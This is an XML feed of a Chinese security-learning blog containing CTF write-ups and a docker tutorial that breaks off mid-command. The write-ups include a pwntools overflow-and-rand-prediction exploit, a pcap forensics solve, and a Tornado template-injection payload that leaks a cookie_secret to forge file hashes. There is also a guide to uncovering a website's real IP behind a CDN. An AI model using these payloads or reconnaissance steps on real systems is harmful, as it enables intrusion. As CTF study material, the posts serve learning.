class="title">srand1</span><span class="params">()</span></span>&#123;</span><br><span class="line">  srand(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rand1</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> rand();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后通过gcc编译成一个so文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared g_rand.c -o g_rand.so</span><br></pre></td></tr></table></figure><p>然后我们在exp中，将文件的路径改为我们生成的so文件，调用变为我们自己的函数，也可以实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;./g_rand.so&#x27;</span>)</span><br><span class="line">libc.srand1()</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">1</span>).decode()</span><br><span class="line">r = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">57255</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(libc.rand1() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;number:&#x27;</span>)</span><br><span class="line">    io.sendline(num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(wp)攻防世界MISC功夫再高也怕菜刀</title>
      <link href="2020/04/01/20200401231442/"/>
      <url>2020/04/01/20200401231442/</url>
      
        <content type="html"><![CDATA[<p>攻防世界MISC类新手题的最后一道题，感觉思路啥的有些绕，不过用到的知识点还是很多的，记录一下。</p><p>这个wp参考网上大佬文章，自己是真的想不出来这种骚操作，还是太菜。</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先将附件下载下来，发现是一个<code>.pcapng</code>，是wireshark抓包后保存的文件。我们通过wireshark打来。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200401232846.png"></p><p>可以发现抓取的包中协议类型有TCP、HTTP、ARP，我们可以确定这是一个网页的请求。</p><p>我们通过搜索关键字<code>flag</code>，可以找到几个有flag关键字的包，逐个查看其TCP流，可以找到几个上传的包，在编号为1150的包的TCP流中，我们可以在其中找到已<code>FFD8</code>开头，<code>FFD9</code>结尾的十六进制串，这里是个知识点，这种开头结尾的十六进制串，是一个图片，我们将其复制出来，通过<code>010Editor</code>新建一个空文件，以十六进制文本粘贴，保存成一个<code>.jpg</code>文件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200401234403.png"></p><p>打开，发现是一个字符串。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200401234441.png"></p><p>将其填入flag，发现不是flag。因此我们又要想了，这个字符串到底是用在哪里呐。</p><p>我们通过<code>binwalk</code>，发现其中还有一个zip文件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200401234614.png"></p><p>通过<code>foremost</code>，分解出隐藏的文件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200401234704.png"></p><p>打开分离出的压缩文件要求输入密码，填入<code>Th1s_1s_p4sswd_!!!</code>，得到flag文件。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这道题中的工具都知道，但是就是没有想到，还是做得题太少，脑子动的太少，归根到底，还是太菜。遇到问题一定要多尝试，把知道的方法都是一遍，总会有成功的时候，再不成功那就是知识面有短缺了，然后网上找一下大佬的wp，多学习。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过CDN获取真实IP</title>
      <link href="2020/03/29/20200329102119/"/>
      <url>2020/03/29/20200329102119/</url>
      
        <content type="html"><![CDATA[<h1 id="CDN介绍"><a href="#CDN介绍" class="headerlink" title="CDN介绍"></a>CDN介绍</h1><p>CDN（Content Delivery Network，即内容分发网络)。CDN是构建在现有网络基础之上的只能虚拟网络，依靠部署在各地的边缘服务器，通过中心的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。</p><h1 id="域名解析过程"><a href="#域名解析过程" class="headerlink" title="域名解析过程"></a>域名解析过程</h1><p>传统访问：用户访问域名-&gt;解析IP-&gt;访问目标主机</p><p>套用CDN后：用户访问域名-&gt;CDN节点-&gt;真实IP-&gt;目标主机</p><p>目前有部分的CDN服务商也提供了WAF的功能，对一些恶意的流量进行拦截。</p><h1 id="CND检测方法"><a href="#CND检测方法" class="headerlink" title="CND检测方法"></a>CND检测方法</h1><h4 id="全球ping"><a href="#全球ping" class="headerlink" title="全球ping"></a>全球ping</h4><p>通过全球各个地方对目标网站进行ping，观察返回的IP地址手否相同，若每个地区的IP地址不相同，则说明存在CDN。</p><p>利用网站：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><h4 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h4><p>通过<code>nslookup</code>工具来判断是否有使用CDN。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2020-03-29%E4%B8%8A%E5%8D%8810.53.04.png"></p><p>若套用了CDN的话，和baidu.com的结果类似，在非权威回到中有多个解答；若没有套用CDN的话，和superj.site的结果类似，在非权威回答中只有一个解答。</p><h1 id="绕过CDN找真实IP"><a href="#绕过CDN找真实IP" class="headerlink" title="绕过CDN找真实IP"></a>绕过CDN找真实IP</h1><h4 id="通过子域找真实IP"><a href="#通过子域找真实IP" class="headerlink" title="通过子域找真实IP"></a>通过子域找真实IP</h4><p>通常使用CDN服务会产生服务费用，网站管理员一般只会给重要的业务和主站使用CDN，而访问较少和不重要的业务不会使用CDN，而且一般情况下，主站和子站会在一个服务器上，因此可以通过子域名来找真实IP。</p><h5 id="收集子域名的方法："><a href="#收集子域名的方法：" class="headerlink" title="收集子域名的方法："></a>收集子域名的方法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># google hacker语法</span><br><span class="line">site:baidu.com</span><br><span class="line"></span><br><span class="line"># 在线工具</span><br><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;domain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;securitytrails.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnsdb.io&#x2F;zh-cn&#x2F;</span><br></pre></td></tr></table></figure><h4 id="通过历史DNS记录找真实IP"><a href="#通过历史DNS记录找真实IP" class="headerlink" title="通过历史DNS记录找真实IP"></a>通过历史DNS记录找真实IP</h4><p>查找DNS的解析记录，在没使用CDN之前，DNS解析的是网站的真实IP。</p><p>可以使用如下网站进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;x.threatbook.cn&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;ipchaxun.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;viewdns.info&#x2F;iphistory&#x2F;</span><br></pre></td></tr></table></figure><h4 id="通过邮箱找真实IP"><a href="#通过邮箱找真实IP" class="headerlink" title="通过邮箱找真实IP"></a>通过邮箱找真实IP</h4><p>我们在访问目标网站的时候，会先去找CDN，但是如果网站主动和客户端通信的话，不会使用CDN，那么我们看到的源地址就是目标网站的真实IP。</p><p>那么什么时候网站会主动和客户通信呢？我们在注册用户、修改密码、找回密码时，服务器会给用户发送邮件，若此时邮件服务器和网站服务器在一起，那么我们就可以获取到网站的真实IP。若两者不在一起，那么绑定IP地址后，可能会造成无法访问目标网站。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200329120932.png"></p><p>![image-20200329121007955](/Users/optimus/Library/Application Support/typora-user-images/image-20200329121007955.png)</p><p>这里的地址是一个ipv6的地址。</p><h4 id="通过探针找真实IP"><a href="#通过探针找真实IP" class="headerlink" title="通过探针找真实IP"></a>通过探针找真实IP</h4><p>如果可以在网站上发现phpinfo.php等文件时，我们可以通过phpinfo()等方法获得真实IP。</p><p>在phpinfo()返回的信息中，SERVER_NAME参数中反悔了真实的IP地址。</p><h4 id="通过网站漏洞找真实IP"><a href="#通过网站漏洞找真实IP" class="headerlink" title="通过网站漏洞找真实IP"></a>通过网站漏洞找真实IP</h4><p>网站若发现存在XSS、命令执行、上传文件、文件包含等漏洞，我们可以直接通过上传探针文件，执行命令来获取网站的真实IP。</p><h4 id="通过网络空间引擎搜索找真实IP"><a href="#通过网络空间引擎搜索找真实IP" class="headerlink" title="通过网络空间引擎搜索找真实IP"></a>通过网络空间引擎搜索找真实IP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;fofa.so&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.zoomeye.org&#x2F;doc</span><br><span class="line">https:&#x2F;&#x2F;www.shodan.io&#x2F;</span><br></pre></td></tr></table></figure><p>只需要输入：<code>title:&quot;网站的title关键字&quot;</code>或者<code>body:&quot;网站的body特征&quot;</code>就可以找出这些引擎收录的有这些关键字的ip域名，很多时候都可以获得网站的真实IP。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CDN绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(wp)buuctf杂项达芬奇密码</title>
      <link href="2020/03/26/20200326003719/"/>
      <url>2020/03/26/20200326003719/</url>
      
        <content type="html"><![CDATA[<p>buuctf是一个收录了各个比赛的题目的靶场，真的是什么题都有，各种脑洞，稀奇古怪的加密编码类型，甚至还有什么中文电码之类的稀奇古怪。</p><p>大家有兴趣可以去刷刷，很棒的刷题地方。</p><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>首先这道题题目是达芬奇密码，百度之后发现这是一部电影，当时也没想的去看一下电影的简介什么的，后面加buuctf关键字，也没有找到相应的wp。果断google，找到大佬的wp，发现在电影简介中会提到——斐波那契数列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309</span><br></pre></td></tr></table></figure><p>对比蒙娜丽莎中的数字列，发现数值一样，但是进行了位移。</p><p>之后对比，题目中给到的两个数列的长度都是32，并且flag也是32位，可以推测，神秘数列是通过flag位移后得出的，而位移的规则是斐波那契数列的位移。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309</span><br><span class="line"></span><br><span class="line">1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">36968853882116725547342176952286</span><br></pre></td></tr></table></figure><p><strong>规则如下：</strong></p><p>第零位1还是1，没有位移。</p><p>第一位233是斐波那契数列的第十二位（以0开始算），因此下面神秘数字串的第一位的6是原本flag的第十二位。</p><p>第二位3是斐波那契数列的第三位，因此下面神秘数字串的第二位的9是原本flag的第三位。</p><p>以此类推……，写出如下脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">fb = <span class="string">&#x27;1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309&#x27;</span></span><br><span class="line"></span><br><span class="line">t = <span class="string">&#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 &#x27;</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;36968853882116725547342176952286&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;a&#x27;</span> * <span class="number">32</span></span><br><span class="line">s = <span class="built_in">list</span>(s)</span><br><span class="line">fb = fb.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">t = t.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    s[fb.index(t[i])] = m[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    print(s[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果中还存在<code>a</code>，是因为斐波那契数列中存在两个1，而在index()找位置的时候，是从前往后找的，因此两次的1会覆盖掉。所以要将m中t的第二次出现1的位置上的数替换给a，然后复原被覆盖的值。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>护网杯——easy_tornado</title>
      <link href="2020/03/24/20200324165054/"/>
      <url>2020/03/24/20200324165054/</url>
      
        <content type="html"><![CDATA[<p>首先我们打开网页，发现三个链接。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/image-20200324165348081.png" alt="image-20200324165348081"></p><p>点击第一个flag.txt，打开提示我们：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200324165534.png"></p><p>我们观察url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;flag.txt&amp;filehash&#x3D;77e8b02dac1f3d976567bc691476bfcc</span><br></pre></td></tr></table></figure><p>发现通过get传递两个参数，一个<code>filename</code>，一个<code>filehash</code>。因此我们可以构造url，访问flag的位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;77e8b02dac1f3d976567bc691476bfcc</span><br></pre></td></tr></table></figure><p>访问发现返回<code>Error</code>。</p><p>因此查看另外两个文件的信息。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200324165850.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200324165859.png"></p><p>发现render，判断这是一个web框架的方法，而下面hints.txt的内容则告诉了我们上面url中的filehash是如何生成的。</p><p>现在我们不知道cookie_secret是多少，我们无论通过<code>F12</code>，在network中查看，还是抓包分析，都没有发现cookie_secret的值。</p><p>现在render这个信息还没有用，那么有没有可能漏洞是出现在这个函数中呐。</p><p>我们通过百度题目名<code>tornado</code>，发现这是一个python的web框架，坚信了问题是在这个框架上面。</p><p>百度<code>tornado render漏洞</code>，发现render是通过传递的参数来确定返回的内容，而我们的报错页面正是通过参数来显示的，因此我们可以利用它来返回tornado中的一些定义的对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>返回信息中确定cookie_secret的值为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;cookie_secret&#x27;: &#x27;d27d0275-4f9b-45f6-b948-37f6b05c8d42&#x27;</span><br></pre></td></tr></table></figure><p>现在我们可以编写脚本，计算hash值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">cookie_secret = <span class="string">&#x27;d27d0275-4f9b-45f6-b948-37f6b05c8d42&#x27;</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line"></span><br><span class="line">file_hash = md5(cookie_secret + md5(file_name).hexdigest())</span><br><span class="line">print(file_hash.hexdigest())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以先将<code>file_name</code>写为<code>/file.txt</code>，执行获得hash值，和原来url中的<code>filehash</code>是否一样，判断脚本正确性。</p><p>执行脚本得到hash值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a99916bbf8732bd409c33d161d751c90</span><br></pre></td></tr></table></figure><p>构造url：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;947550d2-7b15-4f02-9d52-3deb2ec447a9.node3.buuoj.cn&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;a99916bbf8732bd409c33d161d751c90</span><br></pre></td></tr></table></figure><p>访问该url得到flag值。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web_wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker的简单使用</title>
      <link href="2020/03/23/20200323164259/"/>
      <url>2020/03/23/20200323164259/</url>
      
        <content type="html"><![CDATA[<p>本文所写环境是在mac下，所以其他环境下的安装过程就不在赘述，如有需要，可以自行百度，资源还是不少的。</p><p>在学习docker之前，建议先熟悉linux下的命令操作和相关的背景知识学习。</p><h1 id="Docker概念"><a href="#Docker概念" class="headerlink" title="Docker概念"></a>Docker概念</h1><p>docker是一个开源的应用容器引擎。诞生于2013年初，基于Go语言实现，dotCloud公司出品（后改为Docker Inc）。docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的linux机器上。</p><p>容器是完全使用沙箱机制，相互隔离。容器性能开销极低。</p><p>docker从17.3版本之后分为CE（Community Edition社区版）和EE（Enterprise Edition企业版）。</p><p> docker是一种容器技术，解决环境迁移问题。</p><p>我们可以将docker简单的理解为是一种虚拟化技术，虚拟出一个个的虚拟机，然后在这一个个虚拟机中部署服务，当迁移的时候，直接迁移整个虚拟机，将环境和代码同时迁移，解决在生产环境中的环境不匹配的问题。</p><h1 id="MAC下Docker安装"><a href="#MAC下Docker安装" class="headerlink" title="MAC下Docker安装"></a>MAC下Docker安装</h1><p>mac下安装docker可以通过<code>homebrew</code>。<code>homebrew</code>的Cask已经支持Docker for Mac。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install docker</span><br></pre></td></tr></table></figure><p><code>homebrew</code>是一个mac下的包管理工具。</p><h2 id="配置阿里云镜像加速器"><a href="#配置阿里云镜像加速器" class="headerlink" title="配置阿里云镜像加速器"></a>配置阿里云镜像加速器</h2><p>因为默认情况下是从国外下载镜像，因此速度格外的慢。好在大厂已经提供了镜像供我们使用。这里以配置阿里云镜像为例。</p><p>打开阿里云网站，登录，搜索<code>容器镜像服务</code>，打开后如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2020-03-23%E4%B8%8B%E5%8D%885.03.38.png"></p><p>找到自己的加速器地址。点击状态栏docker-&gt;Preferences-&gt;Deamon。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2020-03-23%E4%B8%8B%E5%8D%885.09.32.png"></p><p>点击<code>+</code>，将自己的加速器地址添加到<code>Registry mirrors</code>。然后重启Docker服务，完成配置。</p><h1 id="Docker架构"><a href="#Docker架构" class="headerlink" title="Docker架构"></a>Docker架构</h1><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323171743.png"></p><p>image和container的关系就相当于类和对象的关系。</p><p>**镜像(image)**：Docker镜像，就相当于是一个root文件系统，比如官方镜像<code>ubuntu:16.04</code>就包含了完整的一套<code>ubuntu16.04</code>最小系统的root文件系统。</p><p>**容器(container)**：镜像（image）和容器（container）的关系，就像是面向对象程序设计中的类和对象一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p><p>**仓库(Repository)**：仓库可以理解为git的仓库，git保存的是代码，Docker保存的是镜像。Docker的远程仓库是<code>Docker Hub</code>。</p><h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><h3 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>docker images</td><td>查看下载的镜像</td></tr><tr><td>docker search centos</td><td>搜索镜像，如centos</td></tr><tr><td>docker pull centos[:7]</td><td>拉取镜像，[]可加可不加，是确定其版本。</td></tr><tr><td>docker rmi centos[:7]</td><td>删除镜像</td></tr><tr><td>docker rmi `docker images -q`</td><td>删除所有镜像</td></tr></tbody></table><h3 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h3><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td>docker ps</td><td>查看容器</td></tr><tr><td>docker ps -a</td><td>查看所有容器，包括停止的</td></tr><tr><td>docker run -it –name=容器名 mysql /bin/bash</td><td>创建mysql镜像的容器，并打开交互命令行</td></tr><tr><td>docker run -id –name=容器名 mysql:5.0 /bin/bash</td><td>后台创建mysql:5.0镜像的容器</td></tr><tr><td>docker exec -it 容器名 /bin/bash</td><td>交互命令行打开已创建容器</td></tr><tr><td>docker start 容器名</td><td>启动容器</td></tr><tr><td>docker stop 容器名</td><td>停止容器</td></tr><tr><td>docker rm 容器名/容器id</td><td>删除容器</td></tr><tr><td>docker inspect 容器名</td><td>查看容器信息</td></tr></tbody></table><h1 id="docker容器的数据卷"><a href="#docker容器的数据卷" class="headerlink" title="docker容器的数据卷"></a>docker容器的数据卷</h1><ol><li><p>docker容器删除后，在容器中产生的数据还在吗？</p><p>容器删除后，在容器中产生的数据也会随着容器的删除而被删除。</p></li><li><p>docker容器和外部机器可以直接交换文件吗？</p><p>docker容器是一个封闭的容器，无法和外部机器交换文件。</p></li><li><p>docker容器之间想要进行数据交互？</p><p>因docker容器的封闭，容器之间一般是无法进行数据交换的。</p></li></ol><p>为了解决这三个问题，引入了<strong>数据卷</strong>。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>数据卷是宿主机中的一个目录或文件。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323190809.png"></p><p>在容器中也创建一个目录，将宿主机中的目录挂载到容器中的这个目录，这个时候宿主机的目录就称为数据卷。</p><p>当容器目录和数据卷目录绑定后，对方的修改会立即同步。</p><p>一个数据卷可以被多个容器同时挂载。 </p><p><strong>数据卷的作用：</strong></p><ul><li>容器数据持久化</li><li>外部机器和容器间通信</li><li>容器之间数据交换</li></ul><h3 id="配置数据卷："><a href="#配置数据卷：" class="headerlink" title="配置数据卷："></a>配置数据卷：</h3><p>创建容器时，使用-v参数设置数据卷。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id --name=c1 -v 宿主机目录(文件):容器内目录(文件) centos /bin/bash</span><br></pre></td></tr></table></figure><p><strong>注意事项：</strong></p><ul><li>目录必须是绝对路径</li><li>如果目录不存在，会自动创建</li><li>可以挂载多个数据卷</li></ul><h3 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h3><p>在多容器进行数据交换时，为了方便管理，又引入了数据卷容器的概念，数据卷容器实质是一个容器，它实现了挂载一个目录或文件，然后其他容器再挂载这个容器，它便称之为数据卷容器。</p><p>概念比较绕，看下图可以更好理解。</p><p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200323191537.png"></p><p>其中<code>Data Container c3</code>便是一个数据卷容器。</p><p><strong>配置：</strong></p><ol><li><p>首先配置数据卷容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name=c3 -v /volume centos /bin/bash</span><br></pre></td></tr></table></figure><p>使用-v参数挂载一个目录，这里没有指定宿主机目录位置，会在宿主机中创建一个默认的目录。</p></li><li><p>创建启动c1，c2容器，使用–volumes-from参数，设置数据卷容器。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name=c1 --volumes-from c3 centos /bin/bash</span><br><span class="line">docker run -it --name=c2 --volumes-from c3 centos /bin/bash</span><br></pre></td></tr></table></figure><h1 id="Docker应用部署"><a href="#Docker应用部署" class="headerlink" title="Docker应用部署"></a>Docker应用部署</h1></li></ol><h2 id="mysql部署"><a href="#mysql部署" class="headerlink" title="mysql部署"></a>mysql部署</h2><p>在docker容器中部署mysql，并通过外部mysql客户端操作mysql。</p><h4 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h4><ol><li><p>搜索mysql镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql</span><br></pre></td></tr></table></figure><p>搜索mysql，确定要下载的版本。</p></li><li><p>拉取mysql镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql[:version]</span><br></pre></td></tr></table></figure><p>将mysql的镜像下载到本地。</p></li><li><p>创建容器</p><p>首先现在宿主机中创建一个mysql的文件夹，方便管理文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir mysql</span><br><span class="line">cd mysql</span><br></pre></td></tr></table></figure><p>创建容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id -p 3306:3306 --name=m_mysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=root 